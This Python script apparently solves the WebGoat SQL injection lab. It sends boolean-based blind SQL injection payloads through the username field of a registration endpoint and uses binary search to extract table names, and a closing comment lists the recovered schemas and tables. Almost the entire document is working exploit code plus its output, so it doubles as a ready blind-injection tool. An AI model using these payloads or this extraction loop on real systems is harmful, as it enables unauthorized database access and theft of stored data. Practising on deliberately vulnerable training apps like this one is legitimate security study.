import requests
import string
from tqdm import tqdm

stringset = string.printable
ip = "192.168.1.95"
url = "http://" + ip + ":8888/WebGoat/SqlInjectionAdvanced/register"
cookies = {
    "JSESSIONID": "90F95A800366352F2648DA49D28D9B0C"
}

def send_payload(payload):
    data = {
        "username_reg": payload,
        "email_reg": "a@a.com",
        "password_reg": "a",
        "confirm_password_reg": "a"
    }
    res = requests.put(url, data=data, cookies=cookies)
    # print(res.text)
    # print("--------------------------------------------------------------------")
    return "already exists" in res.text.lower()

def get_table_count(schema):
    for i in tqdm(range(0, 100), desc="DB 개수 추측 중"):
        payload = f"' OR (SELECT COUNT(*) FROM information_schema.tables where table_schema='{schema}') > {i} -- "
        if not send_payload(payload):
            print("\n-----------------------------------------------------------------------")
            print(f"[✓] DB 개수: {i}")
            return i
    return 0

def get_table_name_length(schema,offset):
    for length in range(1, 100):
        payload = f"' OR LENGTH((SELECT table_name FROM information_schema.tables where table_schema='{schema}' LIMIT {offset},1)) > {length} -- "
        if not send_payload(payload):
            print("\n-----------------------------------------------------------------------")
            print(f"[✓] DB #{offset} 이름 길이: {length}")
            return length
    return 0

def get_table_name(schema,offset, length):
    name = ""
    for i in tqdm(range(1, length + 1), desc=f"DB #{offset} 이름 추출 중"):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"' OR ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables where table_schema='{schema}' LIMIT {offset},1), {i}, 1)) > {mid} -- "
            if send_payload(payload):
                low = mid + 1
            else:
                high = mid
        name += chr(low)
        # print(f"    [+] 현재까지: {name}")
    print(f"[✓] DB #{offset} 이름: {name}")
    print("\n-----------------------------------------------------------------------")
    return name

# 대상 스키마 리스트
schemas = ['CONTAINER', 'INFORMATION_SCHEMA', 'PUBLIC', 'SYSTEM_LOBS', 'container', 'd3ng03']
all_tables = {}

# 각 스키마 처리
for schema in schemas:
    table_list = []
    count = get_table_count(schema)
    for i in range(count):
        length = get_table_name_length(schema, i)
        if length > 0:
            name = get_table_name(schema, i, length)
            table_list.append(name)
            print(f"[✓] {schema} 테이블 #{i} 이름: {name}")
    all_tables[schema] = table_list

# 최종 결과 출력
for schema, tables in all_tables.items():
    print(f"\nSchema: {schema}")
    if not tables:
        print("  (no tables)")
    for idx, table in enumerate(tables):
        print(f"  [{idx}] {table}")

'''
Schema: CONTAINER
  [0] ASSIGNMENT
  [1] ASSIGNMENT_PROGRESS
  [2] LESSON_PROGRESS
  [3] LESSON_PROGRESS_ASSIGNMENTS
  [4] USER_PROGRESS
  [5] USER_PROGRESS_LESSON_PROGRESS
  [6] WEB_GOAT_USER
  [7] EMAIL

Schema: INFORMATION_SCHEMA
  [0] SYSTEM_BESTROWIDENTIFIER
  [1] SYSTEM_COLUMNS
  [2] SYSTEM_CROSSREFERENCE
  [3] SYSTEM_INDEXINFO
  [4] SYSTEM_PRIMARYKEYS
  [5] SYSTEM_PROCEDURECOLUMNS
  [6] SYSTEM_PROCEDURES
  [7] SYSTEM_SCHEMAS
  [8] SYSTEM_TABLES
  [9] SYSTEM_TABLETYPES
  [10] SYSTEM_TYPEINFO
  [11] SYSTEM_UDTATTRIBUTES
  [12] SYSTEM_UDTS
  [13] SYSTEM_USERS
  [14] SYSTEM_VERSIONCOLUMNS
  [15] SYSTEM_SEQUENCES
  [16] SYSTEM_CACHEINFO
  [17] SYSTEM_COLUMN_SEQUENCE_USAGE
  [18] SYSTEM_COMMENTS
  [19] SYSTEM_CONNECTION_PROPERTIES
  [20] SYSTEM_INDEXSTATS
  [21] SYSTEM_KEY_INDEX_USAGE
  [22] SYSTEM_PROPERTIES
  [23] SYSTEM_SESSIONINFO
  [24] SYSTEM_SESSIONS
  [25] SYSTEM_TABLESTATS
  [26] SYSTEM_TEXTTABLES
  [27] SYSTEM_SYNONYMS
  [28] ADMINISTRABLE_ROLE_AUTHORIZATIONS
  [29] APPLICABLE_ROLES
  [30] ASSERTIONS
  [31] AUTHORIZATIONS
  [32] CHARACTER_SETS
  [33] CHECK_CONSTRAINT_ROUTINE_USAGE
  [34] CHECK_CONSTRAINTS
  [35] COLLATIONS
  [36] COLUMN_COLUMN_USAGE
  [37] COLUMN_DOMAIN_USAGE
  [38] COLUMN_PRIVILEGES
  [39] COLUMN_UDT_USAGE
  [40] COLUMNS
  [41] CONSTRAINT_COLUMN_USAGE
  [42] CONSTRAINT_PERIOD_USAGE
  [43] CONSTRAINT_TABLE_USAGE
  [44] DATA_TYPE_PRIVILEGES
  [45] DOMAIN_CONSTRAINTS
  [46] DOMAINS
  [47] ELEMENT_TYPES
  [48] ENABLED_ROLES
  [49] INFORMATION_SCHEMA_CATALOG_NAME
  [50] JAR_JAR_USAGE
  [51] JARS
  [52] KEY_COLUMN_USAGE
  [53] KEY_PERIOD_USAGE
  [54] PARAMETERS
  [55] PERIODS
  [56] REFERENTIAL_CONSTRAINTS
  [57] ROLE_AUTHORIZATION_DESCRIPTORS
  [58] ROLE_COLUMN_GRANTS
  [59] ROLE_ROUTINE_GRANTS
  [60] ROLE_TABLE_GRANTS
  [61] ROLE_UDT_GRANTS
  [62] ROLE_USAGE_GRANTS
  [63] ROUTINE_COLUMN_USAGE
  [64] ROUTINE_JAR_USAGE
  [65] ROUTINE_PERIOD_USAGE
  [66] ROUTINE_PRIVILEGES
  [67] ROUTINE_ROUTINE_USAGE
  [68] ROUTINE_SEQUENCE_USAGE
  [69] ROUTINE_TABLE_USAGE
  [70] ROUTINES
  [71] SCHEMATA
  [72] SEQUENCES
  [73] SQL_FEATURES
  [74] SQL_IMPLEMENTATION_INFO
  [75] SQL_PACKAGES
  [76] SQL_PARTS
  [77] SQL_SIZING
  [78] SQL_SIZING_PROFILES
  [79] TABLE_CONSTRAINTS
  [80] TABLE_PRIVILEGES
  [81] TABLES
  [82] TRANSLATIONS
  [83] TRIGGER_COLUMN_USAGE
  [84] TRIGGER_PERIOD_USAGE
  [85] TRIGGER_ROUTINE_USAGE
  [86] TRIGGER_SEQUENCE_USAGE
  [87] TRIGGER_TABLE_USAGE
  [88] TRIGGERED_UPDATE_COLUMNS
  [89] TRIGGERS
  [90] UDT_PRIVILEGES
  [91] USAGE_PRIVILEGES
  [92] USER_DEFINED_TYPES
  [93] VIEW_COLUMN_USAGE
  [94] VIEW_PERIOD_USAGE
  [95] VIEW_ROUTINE_USAGE
  [96] VIEW_TABLE_USAGE
  [97] VIEWS

Schema: PUBLIC
  (no tables)

Schema: SYSTEM_LOBS
  [0] BLOCKS
  [1] LOBS
  [2] PARTS
  [3] LOB_IDS

Schema: container
  [0] flyway_schema_history

Schema: d3ng03
  [0] flyway_schema_history
  [1] CHALLENGE_USERS
  [2] JWT_KEYS
  [3] SERVERS
  [4] USER_DATA
  [5] SALARIES
  [6] USER_DATA_TAN
  [7] SQL_CHALLENGE_USERS
  [8] USER_SYSTEM_DATA
  [9] EMPLOYEES
  [10] ACCESS_LOG
  [11] GRANT_RIGHTS
  [12] ACCESS_CONTROL_USERS
'''